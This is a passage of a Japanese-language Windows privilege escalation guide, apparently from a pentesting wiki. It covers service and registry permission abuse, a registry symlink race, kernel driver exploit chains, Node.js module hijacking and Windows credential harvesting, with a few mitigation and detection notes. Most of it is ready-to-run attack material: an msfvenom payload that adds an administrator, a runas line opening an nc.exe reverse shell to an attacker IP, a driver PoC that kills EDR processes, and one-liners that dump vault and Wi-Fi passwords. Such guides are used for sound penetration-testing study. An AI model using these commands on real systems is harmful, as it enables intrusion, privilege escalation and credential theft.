危険な ACL が **`Everyone`**、**`BUILTIN\Users`**、または **`Authenticated Users`** に付与されていないか確認します。特に、サービスの実行ファイルまたはそれを含むディレクトリに対する **`(F)`**、**`(M)`**、**`(W)`** に注意してください。実際の悪用手順は次のとおりです。<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` でサービスアカウントと実行ファイルのパスを確認します。
2. `icacls <path>` でバイナリが書き込み可能か確認します。
3. サービスバイナリを payload または有効な悪意のあるサービスバイナリに置き換えます。
4. `sc stop <service_name> && sc start <service_name>` でサービスを再起動します（または再起動 / サービストリガーを待ちます）。

自動チェックに役立つもの：<sup>[[28]](#references)</sup>
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> サービスが通常のユーザーによる再起動を許可していない場合は、ブート時に自動的に起動するか、サービスを再起動する failure action が設定されているか、またはサービスを使用するアプリケーションによって間接的に起動できるかを確認してください。

### Services registry の変更権限

いずれかのサービス registry を変更できるか確認してください。\
次の方法で、サービス **registry** に対する **permissions** を**確認**できます。
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が `FullControl` 権限を保有しているか確認する必要があります。保有している場合、service によって実行される binary を変更できます。

実行される binary の Path を変更するには:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### レジストリ symlink race による任意の HKLM value write（ATConfig）

一部の Windows Accessibility 機能は、後から **SYSTEM** process によって HKLM session key にコピーされる、ユーザーごとの **ATConfig** keys を作成します。レジストリ **symbolic link race** により、この特権 write を **任意の HKLM path** へリダイレクトでき、任意の HKLM **value write** primitive が得られます。<sup>[[18]](#references)</sup>

主な locations（例: On-Screen Keyboard `osk`）:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` には、インストール済みの accessibility features が一覧表示されます。
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` には、ユーザーが制御できる configuration が保存されます。
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` は logon/secure-desktop transitions 中に作成され、ユーザーが write 可能です。

Abuse flow（CVE-2026-24291 / ATConfig）:

1. SYSTEM に write させたい **HKCU ATConfig** value を設定します。
2. secure-desktop copy を trigger します（例: **LockWorkstation**）。これにより AT broker flow が開始されます。
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` に **oplock** を設定して **race に勝ちます**。oplock が発生したら、**HKLM Session ATConfig** key を、保護された HKLM target への **registry link** に置き換えます。
4. SYSTEM が、攻撃者が選択した value をリダイレクト先の HKLM path に write します。

任意の HKLM value write を取得したら、service configuration values を上書きして LPE に pivot します。

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath`（EXE/command line）
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll`（DLL）

通常のユーザーが start できる service（例: **`msiserver`**）を選択し、write 後に trigger します。**注記:** public exploit implementation は race の一部として **workstation を lock** します。

Example tooling（RegPwn BOF / standalone）:<sup>[[19]](#references)</sup>
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

レジストリに対してこの権限を持っている場合、**このレジストリからサブレジストリを作成できる**ことを意味します。Windows services の場合、これは**任意の code を実行するのに十分です：**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

実行ファイルのパスが引用符で囲まれていない場合、Windows はスペースの前で終わる各パスを実行しようとします。

たとえば、パスが _C:\Program Files\Some Folder\Service.exe_ の場合、Windows は次を実行しようとします：
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
組み込みのWindowsサービスに属するものを除外し、引用符で囲まれていないすべてのサービスパスを一覧表示します。
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**metasploitでこの脆弱性を検出してexploitできます**: `exploit/windows/local/trusted\_service\_path`  
metasploitでservice binaryを手動作成できます:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

Windows では、service が失敗した場合に実行する actions をユーザーが指定できます。この機能は、binary を指定するように設定できます。この binary を置き換え可能な場合、privilege escalation が可能になることがあります。詳細については、[official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) を参照してください。

## Applications

### Installed Applications

**バイナリの権限**（置き換えて privilege escalation できる可能性があります）と、**フォルダー**（[DLL Hijacking](dll-hijacking/index.html)）の権限を確認します。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 書き込み権限

一部の config file を変更して特殊なファイルを読み取れるか、または Administrator アカウントによって実行される binary（schedtasks）を変更できるかを確認します。

システム内の脆弱な folder/files の権限を見つける方法は、以下を実行することです：
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ は `plugins` サブフォルダ内にある任意の plugin DLL を自動的にロードします。書き込み可能な portable/copy install が存在する場合、悪意のある plugin を配置することで、起動するたびに（`DllMain` や plugin callbacks からも）`notepad++.exe` 内で自動的に code execution が発生します。

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### 起動時に実行

**別の user によって実行される registry または binary を上書きできるか確認します。**\
**以下のページを読む**ことで、**privileges を escalate するための興味深い autoruns locations**について詳しく学べます。


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

**third party の不審な/脆弱な** drivers を探します
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
ドライバーが任意の kernel read/write primitive（設計の不十分な IOCTL handler でよく見られるもの）を公開している場合、kernel memory から SYSTEM token を直接盗むことで privilege escalation できます。<sup>[[13]](#references)</sup> 手順については以下を参照してください：

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

脆弱な call が attacker-controlled な Object Manager path を開く race-condition bug では、lookup を意図的に遅延させる（max-length component や深い directory chain を使用する）ことで、window を数 microseconds から数十 microseconds まで広げられます：

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Cancel-safe queue UAF、paged-pool disclosure、I/O ring pivot

一部の Windows kernel LPE chain は、個別には弱い 2 つの bug から構築できます。1 つは queue lock が保持されたまま request/CBD を解放する **cancel-safe queue lifetime race**、もう 1 つは `RtlCopyToUser` 中に解放済みの paged-pool allocation を leak する **lock-release-before-copy disclosure** です。<sup>[[29]](#references)</sup>

Audit と exploitation に関する注意事項：

- **Free-under-lock + cancel afterwards**：success path が **Acquire -> CompleteRequest/free -> Release** を実行し、cancel path が **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** を実行する箇所を探します。success path が CBDQ/CSQ lock を解放する前に `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` に到達すると、`NtCancelIoFileEx -> IopCsqCancelRoutine` で block されていた thread が後で再開し、解放済みの `PFLT_CALLBACK_DATA` を driver の remove callback に渡す可能性があります。
- 解放済みの queue object を、同じサイズの attacker-controlled paged-pool allocation で **reclaim** します。`NPFS` Data Queue Entries は、payload と size を制御でき、後で pipe の read/peek operation によって probe できるため有用です。解放済み object に list link が埋め込まれている場合は、それらを user memory 内の **cyclic list of fake request nodes** で上書きし、元の list head で終了させず、driver に attacker-defined request structure を繰り返し処理させます。
- **Predictable write を upgrade**：fake request が bookkeeping write（timestamps / QPC / refcount-adjacent field）で使用される nested context pointer を redirect する場合、**address-controlled but not value-controlled** な kernel write を得られる可能性があります。その場合、最終的な code/data pointer ではなく、spray した pool object の **length/size** field を狙い、その後 spray を列挙して、破損した object から **out-of-bounds paged-pool read** を発生させます。
- **Raceable disclosure pattern**：`ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` を実行する syscall は、有力な候補です。attacker が copied buffer を拡大できる場合（例えば、多数の list/resource entry を追加して serializer の最終 allocation size を増加させる）、信頼性が向上します。copy が長くなることで replacement window が広がり、必ずしも machine の crash を引き起こさないためです。
- **Pointer-rich refill target**：Windows **I/O ring** の registered-buffer array は優れた disclosure target です。paged-pool size を attacker が制御でき（`8 * regBufferCnt`）、各 element が `_IOP_MC_BUFFER_ENTRY` への kernel pointer だからです。これらの array の 1 つを leak して、周辺の `IORING_OBJECT` を特定し、**`RegBuffers`** と **`RegBuffersCount`** を corrupt すると、その後の I/O ring operation に attacker-forged entry を使用させ、arbitrary kernel read/write を提供させられます。利用可能な write が stable byte（例えば `KUSER_SHARED_DATA+0x14` からのもの）しか提供しない場合は、**overlapping unaligned write** を使用して `0x0101010101010101` のような repeated-byte user pointer を構築し、`VirtualAlloc` で map して、そこに forged registered-buffer array を配置します。<sup>[[30]](#references)</sup>

有用な debugging indicator：
```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```
破損した I/O ring から任意の kernel read/write を取得したら、標準的な post-primitive workflow を使用して SYSTEM token を奪取します。

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern な hive の脆弱性では、決定論的なレイアウトを groom し、書き込み可能な HKLM/HKU の子孫を悪用して、custom driver なしで metadata corruption を kernel paged-pool overflow に変換できます。完全な chain については、こちらを参照してください。

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### attacker-controlled paths からの `RtlQueryRegistryValues` direct-mode type confusion

一部の driver は userland から registry path を受け取り、それが正常な UTF-16 string であることだけを検証した後、`RTL_QUERY_REGISTRY_DIRECT` を使用して `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` を、`int readValue` のような stack scalar に対して呼び出します。`RTL_QUERY_REGISTRY_TYPECHECK` がない場合、`EntryContext` は developer が想定した type ではなく、**実際の** registry type に従って解釈されます。

これにより、2 つの有用な primitive が生じます:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: user-controlled な絶対 `\Registry\...` path により、driver は attacker が選択した key を query し、return code/log によって存在を leak でき、場合によっては caller が直接アクセスできない value も読み取れます。
- **Kernel memory corruption**: `&readValue` のような scalar destination は、registry value type に応じて、`REG_QWORD`、`UNICODE_STRING`、またはサイズ指定された binary buffer として type-confused されます。

実践的な exploitation の注意点:

- **Windows 8+ mitigation**: `RTL_QUERY_REGISTRY_TYPECHECK` なしで `RTL_QUERY_REGISTRY_DIRECT` を使用し、query が **untrusted hive** に到達すると、kernel caller は `KERNEL_SECURITY_CHECK_FAILURE (0x139)` で crash します。exploitability を維持するには、`HKCU` 配下に value を staging するのではなく、**trusted system hives 内の attacker-writable key** を探してください。
- **Trusted-hive staging**: NtObjectManager を使用して `\Registry\Machine` の writable descendant を列挙し、duplicated **low-integrity** token で scan を再実行して、sandboxed context から到達可能な key を見つけます:<sup>[[26]](#references)</sup>
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: 4バイトの `int` への8バイトの直接書き込みにより、隣接するスタックデータが破損し、近傍のcallback/function pointerを部分的に上書きできる。
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct modeでは、`EntryContext` が `UNICODE_STRING` を指していることを想定する。コードがまず攻撃者制御の `REG_DWORD` をスタック上のスカラーに読み込み、その後同じバッファを文字列読み取りに再利用すると、攻撃者が `Length` / `MaximumLength` を制御し、`Buffer` pointerにも部分的な影響を与えられるため、半制御のkernel writeが発生する。
- **`REG_BINARY`**: 大きなバイナリデータの場合、direct modeは `EntryContext` にある最初の `LONG` を符号付きバッファサイズとして扱う。以前の `REG_DWORD` readによって、再利用されるスカラーに攻撃者制御の**負の値**が残っていると、次の `REG_BINARY` queryによって攻撃者のバイト列が隣接するスタックスロットへ直接コピーされる。これはcallback-pointerを完全に上書きするための、最も容易な経路となることが多い。

有力なhunting pattern: **同じスタック変数への異種registry readを、再初期化せずに行うこと**。`RTL_REGISTRY_ABSOLUTE`、`RTL_QUERY_REGISTRY_DIRECT`、再利用される `EntryContext` pointers、および最初のregistry readが2回目のreadを実行するかどうかを制御するコードパスをgrepする。

#### デバイスオブジェクトでの FILE_DEVICE_SECURE_OPEN の設定漏れの悪用（LPE + EDR kill）

一部のsigned third-party driversは、IoCreateDeviceSecureによって強力なSDDLを指定してデバイスオブジェクトを作成する一方、DeviceCharacteristicsに FILE_DEVICE_SECURE_OPEN を設定し忘れる。このflagがない場合、追加のコンポーネントを含むパスを介してデバイスを開く際にsecure DACLが強制されないため、権限のないユーザーでも次のようなnamespace pathを使用してhandleを取得できる:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (実際の事例より)

ユーザーがデバイスを開けるようになると、driverが公開するprivileged IOCTLをLPEやtamperingに悪用できる。実際の環境で確認された機能の例:
- 任意のprocessに対するfull-access handlesを返す（token theft / DuplicateTokenEx/CreateProcessAsUserによるSYSTEM shell）。
- 制限のないraw disk read/write（offline tampering、boot-time persistence tricks）。
- Protected Process/Light (PP/PPL)を含む任意のprocessをterminateし、kernel経由でuser landからAV/EDR killを可能にする。

最小PoC pattern（user mode）:
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
開発者向けの緩和策
- DACL による制限を意図した device objects を作成する際は、必ず FILE_DEVICE_SECURE_OPEN を設定する。
- 特権操作を行う前に、呼び出し元のコンテキストを検証する。プロセスの終了やハンドルの返却を許可する前に、PP/PPL checks を追加する。
- IOCTLs（access masks、METHOD_*、input validation）を制限し、kernel privileges への直接アクセスではなく、brokered models の利用を検討する。

防御側向けの検出アイデア
- 疑わしい device names（例: \\ .\\amsdk*）の user-mode opens と、悪用を示す特定の IOCTL sequences を監視する。
- Microsoft の vulnerable driver blocklist（HVCI/WDAC/Smart App Control）を適用し、独自の allow/deny lists を維持する。


## PATH DLL Hijacking

**PATH 上に存在するフォルダー内への write permissions** がある場合、プロセスによって読み込まれる DLL を hijack し、**privileges を escalate** できる可能性があります。<sup>[[2]](#references)</sup>

PATH 内のすべてのフォルダーの permissions を確認する:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
このチェックを abuse する方法の詳細については、以下を参照してください。


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` を介した Node.js / Electron の module resolution hijacking

これは、期待される module が **missing** の状態で、`require("foo")` のような bare import を実行する **Node.js** および **Electron** アプリケーションに影響する、**Windows uncontrolled search path** の亜種です。<sup>[[20]](#references)</sup>

Node はディレクトリツリーを上方向にたどり、各親ディレクトリにある `node_modules` フォルダを確認して package を解決します。Windows では、この探索がドライブのルートまで到達する可能性があるため、`C:\Users\Administrator\project\app.js` から起動されたアプリケーションは、最終的に次のパスを探索することがあります。<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**低権限ユーザー** が `C:\node_modules` を作成できる場合、悪意のある `foo.js`（または package フォルダ）を配置し、**高権限の Node/Electron process** が missing dependency を解決するのを待つことができます。payload は被害 process の security context で実行されるため、対象が administrator、elevated scheduled task/service wrapper、または自動起動する特権 desktop app として実行される場合、これは **LPE** になります。

これは特に次のような場合によく発生します。

- dependency が `optionalDependencies` に宣言されている場合<sup>[[22]](#references)</sup>
- third-party library が `require("foo")` を `try/catch` でラップし、失敗時も処理を継続する場合
- production build から package が削除された、packaging 時に含め忘れた、または install に失敗した場合
- 脆弱な `require()` が main application code ではなく、dependency tree の深い場所に存在する場合

### 脆弱な target の Hunting

resolution path を証明するには **Procmon** を使用します。<sup>[[23]](#references)</sup>

- `Process Name` = target executable（`node.exe`、Electron app の EXE、または wrapper process）で filter
- `Path` が `node_modules` を `contains` する条件で filter
- `NAME NOT FOUND` と、`C:\node_modules` 配下で最後に成功する open に注目

unpacked `.asar` files または application sources で役立つ code-review パターン：
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Procmon または source review から **missing package name** を特定します。
2. 存在しない場合は、root lookup directory を作成します。
```powershell
mkdir C:\node_modules
```
3. 想定されている正確な名前のモジュールを配置する：
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. 被害者のアプリケーションをトリガーします。アプリケーションが `require("foo")` を試行し、正規のモジュールが存在しない場合、Node は `C:\node_modules\foo.js` をロードする可能性があります。

このパターンに該当する、実際に存在する missing optional module の例には `bluebird` と `utf-8-validate` があります。ただし、再利用可能な **technique** は次の点です。特権 Windows Node/Electron プロセスが解決する、任意の **missing bare import** を見つけます。

### Detection and hardening ideas

- ユーザーが `C:\node_modules` を作成した場合、またはそこに新しい `.js` ファイルやパッケージを書き込んだ場合に Alert を発生させます。
- 高い integrity レベルのプロセスが `C:\node_modules\*` から読み取っていないか Hunt します。
- 本番環境ではすべての runtime dependencies を Package 化し、`optionalDependencies` の使用を Audit します。
- サードパーティコード内の、無言で実行される `try { require("...") } catch {}` パターンを Review します。
- Library がサポートしている場合は optional probes を Disable します（たとえば、一部の `ws` deployments では `WS_NO_UTF_8_VALIDATE=1` により legacy `utf-8-validate` probe を回避できます）。

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file にハードコードされている既知の他のコンピューターを確認します
```
type C:\Windows\System32\drivers\etc\hosts
```
### ネットワークインターフェースとDNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### 開いているポート

外部から**制限されたサービス**を確認する
```bash
netstat -ano #Opened ports?
```
### ルーティングテーブル
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARPテーブル
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### ファイアウォールルール

[**Firewall 関連のコマンドについてはこのページを確認**](../basic-cmd-for-pentesters.md#firewall) **（ルールの一覧表示、ルールの作成、無効化、無効化など）**

[ネットワーク列挙用のコマンドはこちら](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にもあります。

root user を取得すると、任意のポートで listen できます（初めて `nc.exe` を使用してポートで listen すると、`nc` を firewall で許可するかどうかを GUI で確認されます）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bash を root として簡単に起動するには、`--default-user root` を試せます

`WSL` のファイルシステムは、`C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` フォルダーで確認できます

## Windows の資格情報

### Winlogon の資格情報
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault は、**Windows** が**ユーザーを自動的にログインさせる**ために使用できる、サーバー、Web サイト、その他のプログラムのユーザー認証情報を保存します。最初は、ユーザーが Facebook、Twitter、Gmail などのサイトの認証情報を保存し、ブラウザに自動ログインさせられるように思えるかもしれませんが、実際の仕組みは異なります。

Windows Vault は、Windows がユーザーを自動的にログインさせるために使用できる認証情報を保存します。つまり、リソース（サーバーまたは Web サイト）へのアクセスに認証情報が必要な**Windows アプリケーションは、この Credential Manager** および Windows Vault を利用し、ユーザーが毎回ユーザー名とパスワードを入力する代わりに、保存された認証情報を使用できます。

アプリケーションが Credential Manager と連携しない限り、特定のリソースの認証情報を使用することはできないと思われます。したがって、アプリケーションで vault を利用する場合は、何らかの方法で**credential manager と通信し、デフォルトのストレージ vault からそのリソースの認証情報を要求する**必要があります。

`cmdkey` を使用して、マシンに保存されている認証情報を一覧表示します。
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
その後、保存された認証情報を使用するために、`runas` と `/savecred` オプションを使用できます。次の例では、SMB share 経由でリモートバイナリを呼び出しています。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
提供された資格情報を使用して `runas` を実行する。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)、または[Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)から取得できます。

### UWP PasswordVault / Credential Locker

Modern Windows UWP applications、Microsoft Edge、およびmodern system servicesは、認証tokenとplaintext passwordsをUniversal Windows Platform (UWP)の`PasswordVault`（`vaultcmd`では`Web Credentials`としても公開）内に保存します。このstorage spaceはsession-isolatedであり、administrative rightsや`SeDebugPrivilege`なしでnativeに復号できます。

ユーザーのactive session内で次のPowerShell commandを実行すると、保存されているすべてのusernameとplaintext passwordsを即座にdumpして復号できます：
```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```
### DPAPI

**Data Protection API (DPAPI)** は、主に Windows オペレーティングシステム内で非対称秘密鍵を対称暗号化するために使用される、データの対称暗号化方式を提供します。この暗号化では、ユーザーまたはシステムの秘密情報を利用してエントロピーを大幅に高めます。

**DPAPI は、ユーザーのログイン秘密情報から導出された対称鍵を通じて鍵を暗号化します**。システムの暗号化に関わる場合は、システムのドメイン認証秘密情報を使用します。

DPAPI を使用して暗号化されたユーザー RSA 鍵は、`%APPDATA%\Microsoft\Protect\{SID}` ディレクトリに保存されます。ここで `{SID}` はユーザーの [セキュリティ識別子](https://en.wikipedia.org/wiki/Security_Identifier) を表します。**ユーザーの秘密鍵を保護する master key と同じファイル内に併置された DPAPI 鍵**は、通常、ランダムな 64 バイトのデータで構成されます。（このディレクトリへのアクセスは制限されているため、CMD の `dir` コマンドでは内容を一覧表示できませんが、PowerShell では一覧表示できます。）
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
適切な引数（`/pvk` または `/rpc`）を指定して、**mimikatz module** `dpapi::masterkey` を使用すると復号できます。

**master password で保護された credentials files** は通常、次の場所にあります：
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
適切な `/masterkey` を指定して **mimikatz module** の `dpapi::cred` を使用すると復号できます。\
`sekurlsa::dpapi` module を使用すると、**memory** から **DPAPI** の **masterkeys** を多数 **extract** できます（root の場合）。

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell 資格情報

**PowerShell 資格情報** は、暗号化された資格情報を便利に保存する方法として、**scripting** や自動化タスクでよく使用されます。資格情報は **DPAPI** を使用して保護されます。通常、作成時と同じコンピューター上の同じユーザーだけが復号できます。

資格情報を含むファイルから PS 資格情報を **decrypt** するには、次のように実行します。
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 保存された RDP 接続

`HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
および `HKCU\Software\Microsoft\Terminal Server Client\Servers\` にあります。

### 最近実行されたコマンド
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
